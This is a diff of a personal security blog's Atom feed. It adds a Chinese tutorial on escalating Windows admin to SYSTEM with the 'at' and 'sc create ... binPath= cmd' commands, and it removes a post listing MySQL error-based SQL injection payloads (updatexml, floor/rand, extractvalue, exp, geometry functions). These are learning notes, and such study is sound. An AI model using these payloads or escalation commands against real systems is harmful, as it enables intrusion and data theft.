@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://Err0rzz.github.io/"/>
-  <updated>2018-03-09T10:42:14.612Z</updated>
+  <updated>2018-03-12T06:52:15.407Z</updated>
   <id>http://Err0rzz.github.io/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>提权</title>
+    <link href="http://Err0rzz.github.io/2018/03/12/%E6%8F%90%E6%9D%83/"/>
+    <id>http://Err0rzz.github.io/2018/03/12/提权/</id>
+    <published>2018-03-12T05:14:01.000Z</published>
+    <updated>2018-03-12T06:52:15.407Z</updated>
+    
+    <content type="html"><![CDATA[<p>该文章参考安全牛课堂：<a href="https://edu.aqniu.com/my/course/415" target="_blank" rel="external">https://edu.aqniu.com/my/course/415</a></p><h1 id="admin提升为system"><a href="#admin提升为system" class="headerlink" title="admin提升为system"></a>admin提升为system</h1><p>先查看一下目前系统所有用户的身份：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net user</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/tQa4uW8.png" alt=""></p><h2 id="at命令"><a href="#at命令" class="headerlink" title="at命令"></a>at命令</h2><p>这是一个admin才能使用的命令，普通用户无法使用。且系统不适用于win7及以上版本<br>查看命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">at /?</div></pre></td></tr></table></figure></p><p>然后使用<strong>time</strong>参数来使得系统在特定的时间执行一条命令，且系统会以<strong>system</strong>权限执行，来达到提权的目的：</p><p>例如，先用zz这个admin的身份来打开一个cmd<br><img src="https://i.imgur.com/qXT13kQ.png" alt=""></p><p>当前系统时间为13:33，然后输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">at 13：35 /interactive cmd</div></pre></td></tr></table></figure></p><p>interactive是表示交互式运行。</p><p>然后输入<code>at</code>即可查看当前的任务<br><img src="https://i.imgur.com/1aR3bIK.png" alt=""></p><p>然后时间一到，就弹出了一个system运行的cmd框<br><img src="https://i.imgur.com/2P8RWlu.png" alt=""></p><p>如果觉得只是弹个cmd对于使用来说还是不方便的话，可以用cmd输入:<code>taskmgr</code>命令来打开任务管理器，然后kill进程explorer，再重新打开任务explorer，使得整个桌面系统都是system权限：<br><img src="https://i.imgur.com/cD5yW31.png" alt=""></p><h2 id="sc命令"><a href="#sc命令" class="headerlink" title="sc命令"></a>sc命令</h2><p>上面讲到at命令不能用于win7及以上版本，那我们就用sc命令来创建service，因为service的启动默认情况下是system权限的，所以就可以达到提权的目的。</p><p>我们可以先通过运行<code>services.msc</code>来看一下系统中既有哪些服务<br><img src="https://i.imgur.com/YEv70hx.png" alt=""></p><p>然后查看一下sc命令，输入以下命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt;sc create syscmd binPath= &quot;cmd /K start&quot; type= own type= interact</div><div class="line">create:创建一个服务</div><div class="line">syscmd:随便创建的别称</div><div class="line">binPath:命令路径，&quot;cmd /K start&quot;表示该service是用来打开一个cmd命令</div><div class="line">type:表示该服务类型，&quot;interact&quot;表示交互式的命令</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/Rg66DEl.png" alt=""></p><p>然后就可以看到刚创建的syscmd服务：<br><img src="https://i.imgur.com/dwGProC.png" alt=""></p><p>然后启动该服务：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&gt;sc start syscmd</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/7ROXTGw.png" alt=""><br>就获得了system的cmd了</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;该文章参考安全牛课堂：&lt;a href=&quot;https://edu.aqniu.com/my/course/415&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://edu.aqniu.com/my/course/415&lt;/a&gt;&lt;/p&gt;
+&lt;h1 i
+      
+    
+    </summary>
+    
+    
+      <category term="渗透" scheme="http://Err0rzz.github.io/tags/%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
   
   <entry>
     <title>Ubuntu下Apache2开启/关闭模板方法</title>
@@ -208,9 +232,9 @@
     </summary>
     
     
-      <category term="writeup" scheme="http://Err0rzz.github.io/tags/writeup/"/>
-    
       <category term="ctf" scheme="http://Err0rzz.github.io/tags/ctf/"/>
+    
+      <category term="writeup" scheme="http://Err0rzz.github.io/tags/writeup/"/>
     
   </entry>
   
@@ -396,26 +420,6 @@
     
     </summary>
     
-    
-  </entry>
-  
-  <entry>
-    <title>mysql显错注入</title>
-    <link href="http://Err0rzz.github.io/2017/10/31/updatexml-mysql%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5/"/>
-    <id>http://Err0rzz.github.io/2017/10/31/updatexml-mysql显错注入/</id>
-    <published>2017-10-31T06:51:09.000Z</published>
-    <updated>2017-12-26T07:47:40.763Z</updated>
-    
-    <content type="html"><![CDATA[<p>整理一下那些报错注入的函数吧</p><a id="more"></a><p>报错注入的前提条件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">一般是在页面没有显示位、但用echo mysql_error();输出了错误信息的时候使用，</div><div class="line">它的特点是注入速度快，但是语句较复杂,不能用group_concat(),只能用limit依次猜解</div></pre></td></tr></table></figure></p><h1 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h1><p>updatexml(xml_document,xpath_string,new_value);<br>第一个参数:xml_documnet是String格式，为XML文档对象的名称，文中为Doc。<br>第二个参数:xpath_string(xpath格式的字符串),如果不了解xpath语法,可以在网上查找教程。<br>第三个参数:new_value,string格式,替换查找到的符合条件的数据。</p><p>然后咋们再看看语句:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.XXXIII.com/a.php?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</div></pre></td></tr></table></figure></p><p><code>concat(str1,str2,...)</code><br>返回结果为连接参数产生的字符串。如有任何一个参数为null，则返回值为null。</p><p>通过查询@@version,返回版本。然后<code>concat</code>将其字符串化。因为<code>updatexml</code>第二个参数需要xpath格式的字符串,所以不符合要求，然后报错。</p><p>错误大概会是:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ERROR 1105 (HY000): XPATH syntax error: ’:root@localhost’</div></pre></td></tr></table></figure></p><p><br></p><h1 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h1><p>利用方式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">count(*)、rand()、group by三者缺一不可</div><div class="line">报错注入用一个公式，只要套用公式即可，公式如下:</div><div class="line">?id=2&apos; and (select 1 from (select count(*),concat( floor(rand(0)*2),(select (select (爆错语句)) from information_schema.tables limit 0,1))x from information_schema.tables group by x )a</div><div class="line">)--+</div></pre></td></tr></table></figure></p><p>公式解析：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">floor()是取整数</div><div class="line">rand()在0和1之间产生一个随机数</div><div class="line">rand(0)*2将取0到2的随机数</div><div class="line">floor(rand()*2)有两条记录就会报错</div><div class="line">floor(rand(0)*2)记录需为3条以上，且3条以上必报错，返回的值是有规律的</div><div class="line">count(*)是用来统计结果的，相当于刷新一次结果</div><div class="line">group by在对数据进行分组时会先看看虚拟表里有没有这个值，没有的话就插入存在的话count(*)加1</div><div class="line">在使用group by时floor(rand(0)*2)会被执行一次，若虚表不存在记录，插入虚表时会再执行一次</div></pre></td></tr></table></figure></p><p><br><br>如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id = 1 and (select 1 from  (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a)</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/t4bx8Je.png" alt=""></p><h1 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id = 1 and (extractvalue(1, concat(0x5c,(select user()))))</div></pre></td></tr></table></figure><p><img src="https://i.imgur.com/N5CsyQo.png" alt=""><br><br></p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id =1 and EXP(~(SELECT * from(select user())a))</div></pre></td></tr></table></figure><p><img src="https://i.imgur.com/zriO4fi.png" alt=""></p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">GeometryCollection()</div><div class="line">id = 1 AND GeometryCollection((select * from (select * from(select user())a)b))</div><div class="line"></div><div class="line">polygon()</div><div class="line">id =1 AND polygon((select * from(select * from(select user())a)b))</div><div class="line"></div><div class="line">multipoint()</div><div class="line">id = 1 AND multipoint((select * from(select * from(select user())a)b))</div><div class="line"></div><div class="line">multilinestring()</div><div class="line">id = 1 AND multilinestring((select * from(select * from(select user())a)b))</div><div class="line"></div><div class="line">linestring()</div><div class="line">id = 1 AND LINESTRING((select * from(select * from(select user())a)b))</div><div class="line"></div><div class="line">multipolygon()</div><div class="line">id =1 AND multipolygon((select * from(select * from(select user())a)b))</div></pre></td></tr></table></figure><p><img src="https://i.imgur.com/mTPTJNt.png" alt=""></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;整理一下那些报错注入的函数吧&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="注入" scheme="http://Err0rzz.github.io/tags/%E6%B3%A8%E5%85%A5/"/>
     
   </entry>
   
